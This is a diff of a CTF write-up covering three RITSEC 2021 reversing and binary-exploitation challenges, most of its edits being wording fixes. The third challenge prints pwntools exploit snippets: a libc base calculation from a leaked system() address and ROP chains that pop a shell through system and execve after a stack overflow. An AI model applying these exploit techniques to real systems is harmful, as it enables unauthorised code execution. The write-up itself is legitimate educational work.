@@ -1,5 +1,5 @@
 # RITSEC 2021 Reversing / Binary Exploitation Challenge Write-ups
-The following write-up includes three challenges from RIT's RITSEC CTF 2021 competition.  All three challenges were in the `REV/BIN` category and featured some clever reverse engineering or binary exploitation.  I completed the challenges with OffSec classmate Evan, and certainly could not have progressed through some mental blocks without his ingenuity.     
+The following write-up includes three challenges from RIT's RITSEC CTF 2021 competition.  All three challenges were in the `REV/BIN` category and featured some clever reverse engineering or binary exploitation.
 
 ## Table of Contents
 * snek - 100 pts
@@ -12,10 +12,10 @@ Kicking off the `REV/BIN` category is a challenge called "snek".  All we are giv
 
 ![no-step-on-snek](https://i.kym-cdn.com/photos/images/original/001/116/586/96f.jpg).  
 
-This might not be much of a hint for some players, so the logical next step is to try and identify the file.  Running `file` simply returns `data` which proves that this is not a standard ELF or PE executable.  `strings` reveals some useful information, including `__init__` and `__name__`, which are indicative of a Python file.  Suddenly the hint makes sense!  However this is not a Python `.py` source code file, but rather compiled Python bytecode.  
+This might not be much of a hint for some players, so the logical next step is to try and identify the file.  Running `file` simply returns `data` which indicates that this is not a standard ELF or PE executable.  `strings` reveals some useful information, including `__init__` and `__name__`, which are indicative of a Python file.  Suddenly the hint makes sense!  However this is not a Python `.py` source code file, but rather compiled Python bytecode.  
 
 
-The next hurdle comes when trying to execute the program.  Depending on the version of Python a contestant has installed, the bytecode may or may not execute.  By luck, my attempt at running with Python3 version 3.9+ failed, but Evan's v3.7 executed it without an error.  This led us to create a Docker container running Python 3.7 instead of trying to revert my Python version.  We set about determining an appropriate disassembler to add to the Dockerfile's installation dependencies and found a suitable candidate, [xdis](https://pypi.org/project/xdis/).  This utility also requires Python's `click`.  These dependencies are installed in the Python 3.7 Docker container using the Dockerfile shown below: 
+The next hurdle occurs when trying to execute the program.  Depending on the version of Python a contestant has installed the bytecode may or may not execute.  By chance, an attempt running the file with Python v3.7 executed it without an error.   However a Docker container running Python 3.7 was created as a more flexible solution for those running Python >v3.7.  The next step was to determine an appropriate disassembler which would be added to the Dockerfile's installation dependencies.  A suitable candidate, [xdis](https://pypi.org/project/xdis/), was found.  This utility also requires Python's `click`, and both dependencies were installed in the Python 3.7 Docker image using the Dockerfile shown below: 
 
 ~~~Dockerfile
 FROM python:3.7
@@ -37,10 +37,10 @@ WRONG
 Clearly some reverse engineering is required to identify the correct input and retrieve the flag.
 
 #### Reverse Engineering the Bytecode
-As mentioned previously, the `xdis` utility can assist by disassembling the compiled Python bytecode.  `xdis` can be run using a Python script, but also has a convenient CLI extension: `pydisasm`.  Beforehand, the file must be changed to use a `.pyc` extension so the disassembler can process it.  Using `pydisasm snek.pyc` yields a significant amount of metadata which indicates the source is Python 3.7 bytecode, as we established earlier.  Furthermore, the utility disassembles each method.  There are multiple methods recognized, however the key to this challenge exists in the `<module>` and `__init__` methods, which are described below 
+As mentioned previously, the `xdis` utility can assist by disassembling the compiled Python bytecode.  `xdis` can be run using a Python script, but also has a convenient CLI extension: `pydisasm`.  The file must be changed to use a `.pyc` extension before the disassembler can process it.  `pydisasm snek.pyc` yields a significant amount of metadata which indicates the source is Python 3.7 bytecode, as we established earlier.  Furthermore, the utility disassembles each method.  There are multiple methods recognized, however the key to this challenge exists in the `<module>` and `__init__` methods, which are described below 
 
 ##### <module>
-The `<module>` method takes care of user interaction and initializing the environment.  It first creates a `d` object of type `'d'`, which is an object with two methods: `__init__` and `__eq__`.  For the sake of brevity, `__eq__` overloads the `==` operator and checks the equivalence of two parameters. The `__init__` method will be discussed in the next section.  `<module>` proceeds to print the problem prompt and accept user input, storing it in `x`.  Lines 28-34 define an object `a` of type `d`, instantiated with `x` as its input (e.g. `a = d(x)`).  Without any further reverse engineering, it is logical to assume that the `d` object performs an encryption / decryption algorithm, as the following command compares equivalence between `a` and `x`.  This is odd, however, as the resulting control flow either prints out `IS_THIS_THE_FLAG??` followed by `NOPE`, or `WRONG`.  It would therefore seem as if feeding the decrypted key into the program does not, in fact, yield the flag.  We next took a look into the `'d'` method, leading to an investigation of the `__init__` method.  
+The `<module>` method takes care of user interaction and initializing the environment.  It first creates a class `d` with methods `__init__` and `__eq__`.  For the sake of brevity, `__eq__` overloads the `==` operator and checks the equivalence of two parameters, `password` and `self.decrypt()`. The `__init__` method will be discussed in the next section.  `<module>` proceeds to print the problem prompt and accept user input, storing it in `x`.  Lines 28-34 define an object `a` of class `d`, instantiated with `x` as its input (e.g. `a = d(x)`).  Without any further reverse engineering, it is logical to assume that the `d` object performs an encryption / decryption algorithm, as the following line compares equivalence between `a` and `x`.  This is odd, however, as the resulting control flow either prints out `IS_THIS_THE_FLAG??` followed by `NOPE`, or `WRONG`.  It would therefore seem as if feeding the decrypted key into the program does not, in fact, yield the flag.  We next took a look into the `'d'` method, leading to an investigation of the `__init__` method.  
 
 ~~~asm 
   9:           4 LOAD_BUILD_CLASS
@@ -88,7 +88,7 @@ The `<module>` method takes care of user interaction and initializing the enviro
 ~~~
 
 ##### __init__
-As mentioned above, an object created of type `'d'` is instantiated using the `__init__` method.  This method is relatively simple, and contains the info necessary for solving the challenge.  The method only takes two parameters, `self` and `password`, and the `password` input is first encoded into bytes, assuming a string input.  Next, a 77 byte list is created using a number of defined constants and stored in the member variable `self.decrypt`.  It is also noted that the `__eq__` method uses this `self.decrypt` variable for equivalence checking against an input string.  Furthermore, the loaded bytes appear to be ASCII letter values.  Therefore it is logical to assume that this string either is our key or contains our key.  
+As mentioned above, a class of type`d` is instantiated using the `__init__` method.  This method is relatively simple, and contains the info necessary for solving the challenge.  The method only takes two parameters, `self` and `password`.  The `password` input is first encoded into bytes, assuming a string input.  Next, a 77 byte list is created using a number of defined constants and stored in the member variable `self.decrypt`.  It is also noted that the `__eq__` method uses this `self.decrypt` variable for equivalence checking against an input string.  Furthermore, the loaded bytes appear to be ASCII letter values.  Therefore it is logical to assume that this string either is our key or contains our key.  
 
 ~~~asm 
 # Varnames:
@@ -192,7 +192,6 @@ A simple Python file was created to output the presumed ASCII values as characte
 #!/usr/bin/python3
 key = [97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 82, 83, 123, 97, 108, 108, 95, 104, 105, 36, 36, 95, 97, 110, 100, 95, 110, 48, 95, 98, 105, 116, 51, 125]
 
-
 for k in key: 
     print(chr(k), end="")
 ~~~
@@ -201,17 +200,17 @@ The result was the string: `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
 
 ## Fleshwound - 200 pts
 #### Framing the Challenge
-The next challenge in the `REV/BIN` category, Fleshwound, provided a single file `fleshwound.json` and the hint `Tis but a....`.  Monty Python fans will immediately recognize the truncated quote, though again the hint is not immediately apparent.  Investigation of the `fleshwound.json` file shows a lot of...garbage?  It is not clear how the JSON file should be interpreted.  A number of the fields are either obfuscated or otherwise poorly named and the plain text does not clearly indicate a path forward.  One interesting observation is that the file defines a number of "opcodes", with commands like `event_whenflagclicked`, `sensing_askandwait`, and `operator_equals`.  A quick search for these method names leads to [MIT's Scratch platform](https://scratch.mit.edu/) - an online application meant to introduce children to fundamental programming cconcepts.  This makes logical sense when considered in context with the challenge hint:
+The next challenge in the `REV/BIN` category, Fleshwound, provided a single file `fleshwound.json` and the hint `Tis but a....`.  Monty Python fans will immediately recognize the truncated quote, though again the hint is not immediately apparent.  Investigation of the `fleshwound.json` file shows a lot of...garbage?  It is not clear how the JSON file should be interpreted.  A number of the fields are either obfuscated or otherwise poorly named and the plain text does not clearly indicate a path forward.  One interesting observation is that the file defines a number of "opcodes", with commands like `event_whenflagclicked`, `sensing_askandwait`, and `operator_equals`.  A quick search for these method names leads to [MIT's Scratch platform](https://scratch.mit.edu/) - an online application meant to introduce children to fundamental programming concepts.  This makes logical sense when considered in context with the challenge hint:
 
 ![tis_but_a_scratch](https://64.media.tumblr.com/tumblr_lwrv52wVCC1qmfycwo1_500.png)
 
-The online platform accepts upload files, so long as they have a `.sb3` file extension, and modifying the file to `fleshwound.json.sb3` allows for successful import.
+The online platform accepts uploads, so long as they have a `.sb3` file extension, and modifying the file to `fleshwound.json.sb3` allows for successful import.
 
 #### Reverse Engineering(?)
 
 ![scratch_1](https://raw.githubusercontent.com/comed-ian/CTF-Writeups/main/RITSEC-2021/_images/scratch_1.png)
 
-The next step, now that the Scratch file is uploaded, is half reverse engineering and half understanding how Scratch works. Simple testing showed that the green flag icon runs a prompt asking `What do you seek?`.  This seems to be on the right path, but a seemingly incorrect input does not yield positive or negative feedback.  Searching the JSON file for this string shows that it resides within a `sensing_askandwait` opcode.  It also shows that this "method" calls method `iybEVB.t5+ShRV.(sy,r` as the next "block" which is a `control_if` opcode.  This makes logical sense, as the program should compare the user input with some key.  The operation uses condition `ds7|:EA%,[mCT/qcZQGw` in its comparison, which happens to be the next field.  This `operator_equals` opcode uses defined operands, one of which is `gib flag`!  
+The next step, now that the Scratch file is uploaded, is half reverse engineering and half understanding how Scratch works. Simple testing showed that the green flag icon runs a prompt asking `What do you seek?`.  This seems to be on the right path, but a seemingly incorrect input does not yield positive or negative feedback.  Searching the JSON file for this string shows that it resides within a `sensing_askandwait` opcode.  It also shows that this "method" calls `iybEVB.t5+ShRV.(sy,r` as the next "block" which is a `control_if` opcode.  This makes logical sense, as the program should compare the user input with some key.  The operation uses condition `ds7|:EA%,[mCT/qcZQGw` in its comparison, which happens to be the next JSON field.  This `operator_equals` opcode uses defined operands, one of which is `gib flag`!  
 
 ~~~json
 "Soe6]HpjC+UgMd:@;}m`": {
@@ -276,11 +275,11 @@ The next step, now that the Scratch file is uploaded, is half reverse engineerin
 },
 ~~~
 
-The program was re-run using `gib flag` as the input, and the drum icon in the upper right (which is a "Sprite", one of Scratch's animated characters / objects" prints out `RS...{...Hmm is this is a distraction?!...Dancing...`.  Clearly this is on the right path, however some additional investigation must be performed.  Doing some brief recon, the Scratch platform appears to generate code using color-coded blocks and internal variables.  For example, it appears that an `__init__` function is declared which runs `fleshwound.json.py` from the uploaded JSON, which presumably runs the command prompt, but there is no instance where `__init__` is called.  After much poking around, a different Backdrop 1 "Stage" was discovered.  This is essentially another workspace for organizing the Scratch program and defines the behavior for when the green flag is clicked!
+The program was re-run using `gib flag` as the input, and the drum icon in the upper right (which is a "Sprite", one of Scratch's animated characters / objects) prints out `RS...{...Hmm is this is a distraction?!...Dancing...`.  Clearly this is on the right path, however some additional investigation must be performed.  Doing some brief recon, the Scratch platform appears to generate code using color-coded blocks and internal variables.  For example, it appears that an `__init__` function is declared which runs `fleshwound.json.py` from the uploaded JSON, which presumably runs the command prompt, but there is no instance where `__init__` is called.  After much poking around, a different Backdrop 1 "Stage" was discovered.  This is essentially another workspace for organizing the Scratch program and defines the behavior for clicking the green flag!
 
 ![backdrop_1](https://raw.githubusercontent.com/comed-ian/CTF-Writeups/main/RITSEC-2021/_images/backdrop_1.png)
 
-Here it shows that the initial `RS{` are output using the Sprite's `think` command, however the `distract_me` function is called which prints the remaining text.  Clearly this call should be modified to something that prints out the remainder of the flag.  Again, much poking around ensued, until discovery of yet another Backdrop represented by the drum Sprite.  This backdrop contains commands a `finish` function which end with a `}`, which logically represents the rest of the flag.  Navigating back to Backdrop 1 and changing the `broadcast` block from `distract_me and wait` to `finish and wait`, the flag `RS{eeee_whats_th@t_scratch?}` is printed out sequentially!
+This Stage shows that the initial `RS{` are output using the Sprite's `think` command, however the `distract_me` function is called which prints the remaining text.  Clearly this call should be modified to something that prints out the remainder of the flag.  Again, much poking around ensued, until discovery of yet another Stage represented by the drum Sprite.  This contains commands a `finish` function which end with a `}`, which logically represents the rest of the flag.  Navigating back to Backdrop 1 and changing the `broadcast` block from `distract_me and wait` to `finish and wait`, the flag `RS{eeee_whats_th@t_scratch?}` is printed out sequentially in the drum's thought bubbles!
 
 ![scratch_2](https://raw.githubusercontent.com/comed-ian/CTF-Writeups/main/RITSEC-2021/_images/scratch_2.png)
 
@@ -296,7 +295,7 @@ void vuln() {
 }
 ~~~
 
-The rest of main establishes a graph with a randomized number of vertices and edges and prompts the user to determine if the graph is Eulerian (Y or N).  The user input is compared against a global `bruh` variable which is set in `generateGraph()` based on the whether any of the vertices has an even degree.
+The rest of main establishes a graph with a randomized number of vertices and edges and prompts the user to determine if the graph is Eulerian ('Y' or 'N').  The user input is compared against a global `bruh` variable which is set in `generateGraph()` based on the whether any of the vertices has an even degree.
 
 ~~~c
 int main() {
@@ -331,9 +330,9 @@ int main() {
 }
 ~~~
 
-It does not seem intially feasible to compute whether the tree is Eulerian simply by the number of edges and vertices, which is printed out to the console with each prompt.  However, this loop only executes `NQUIZ = 5` times.  Thus, brute forcing the answer will work one of every `2^5 = 32` times.  Furthermore, some fuzzing was performed to understand whether there is an implicit bias toward 'Y' or 'N'.  Results of thousands of iterations show that the correct answer is 'N'  more than 3x as often.  This can be rationalized by understanding that `bruh` is set to false if *any* of the vertices has an even degree.  Since each graph is generated randomly with 2-10 vertices and (V(V-1))/2 edges, there is logically a much better chance that the `bruh` variable is false.  
+It does not seem initially feasible to compute the 'Y' or 'N' answer simply using the total number of edges and vertices, which are printed out to the console with each prompt.  However, this loop only executes `NQUIZ = 5` times.  Thus, brute forcing the answer will work one of every `2^5 = 32` times.  Furthermore, some fuzzing was performed to understand whether there is an implicit bias toward 'Y' or 'N'.  Results of thousands of iterations show that the correct answer is 'N'  approximately 3x as often as 'Y'.  This can be rationalized by understanding that `bruh` is set to false if *any* of the vertices has an even degree.  Since each graph is generated randomly with 2-10 vertices and (V(V-1))/2 edges, there is logically a much better chance that the `bruh` variable is false.  
 
-After a few lucky guesses (`N-N-N-Y-N` seemed to be a lucky winning combination), `vuln()` was called.  Here the binary prints the address of `system()` and prompts for user input, retrieving it with `fgets()`.  While `fgets()` is a safer function than its vulnerable cousin `gets()`, the program has a clear overflow vulnerability by reading in 400 bytes into a 100 byte buffer.  Disassembly shows that the buffer is actually set to `0x70 = 112` bytes, but still clearly vulnerable to overflow.  This allows for RIP control and a rop chain that uses gadgets in both the binary and libc, since the address to `system` can be used to calculate libc's base address during execution.  A snippet from `baby_graph_solver.py` is included below showing the calculation.  
+After a few lucky guesses (`N-N-N-Y-N` seemed to be a lucky winning combination), `vuln()` was called.  Here the binary prints the address of `system()` and prompts for user input, retrieving it with `fgets()`.  While `fgets()` is a safer function than its vulnerable cousin `gets()`, the program has a clear overflow vulnerability by reading in 400 bytes into a 100 byte buffer.  Disassembly shows that the buffer is actually set to `0x70 = 112` bytes, but still clearly vulnerable to overflow.  This allows for RIP control and a ROP chain that uses gadgets in both the binary and libc, since the address to `system` can be used to calculate libc's base address during execution.  A snippet from `babygraph_solver.py` is included below showing the calculation.  
 
 ~~~python
 # receive the system pointer from binary output
@@ -346,7 +345,7 @@ system_offset = libc.symbols['system']
 libc_base = system_addr - system_offset
 ~~~ 
 
-The rationale for finding libc's base address is to locate the address of `/bin/sh` to get a shell, as `/bin/sh` does not exist in the binary itself.  The buffer can be overflowed precicely, or the chain case use a `ret` address to create a "ret sled" that will slide into the first ROP gadget.  Since there are plenty of `pop rdi` gadgets in libc that can pop `/bin/sh` into the register, the ROP chain should be as simple as: 
+The rationale for finding libc's base address is to locate the address of `/bin/sh` to get a shell, as `/bin/sh` does not exist in the binary itself.  The buffer can be overflowed precisely, or the chain can use a `ret` address to create a "ret sled" that will slide into the first ROP gadget.  Since there are plenty of `pop rdi` gadgets in libc that can pop `/bin/sh` into the register, the ROP chain should be as simple as: 
 
 ~~~python
 r = ROP(libc)
@@ -367,7 +366,7 @@ chain = [
 p.sendline(p64(ret_addr) * (250 // 8) +  b''.join(p64(r) for r in chain))
 ~~~
 
-Only, it's not?  The exploit, which works locally, continued to fail on the server.  Extensive debugging ensued which included a successful call to `puts` with `/bin/sh` popped into `rdi`.  Therefore the only conclusion which can be reached is that there was an error in the call to `system` on the server binary.  
+Only, it's not?  The exploit, which works locally, continued to fail on the server.  Extensive debugging ensued which included a successful call to `puts` with `/bin/sh` popped into `rdi`.  Therefore the only conclusion which can be reached is that there was an error (intentional or otherwise) in the call to `system` in the server binary.  
 
 An alternative means of popping a shell was created; this time using `execve` in lieu of `system`.  With libc available, finding `pop rsi` and `pop rdx` gadgets was not difficult, though the provided libc's simplest `pop rdx` gadget also included a pop to `r12`.  Furthermore, some implementations require that `rsi` and `rdx` point to `NULL` as opposed to storing `NULL` directly in the register.  Taking this into account, the following rop chain was developed:
 
@@ -392,9 +391,9 @@ chain = [
     pop_rdi_addr,
     bin_sh_addr,    # rdi
     pop_rsi_addr,
-    nullptr_addr,              # rsi
+    nullptr_addr,   # rsi
     pop_rdx_addr,
-    nullptr_addr,              # rdx
+    nullptr_addr,   # rdx
     0,              # r12
     execve_addr,
 ]
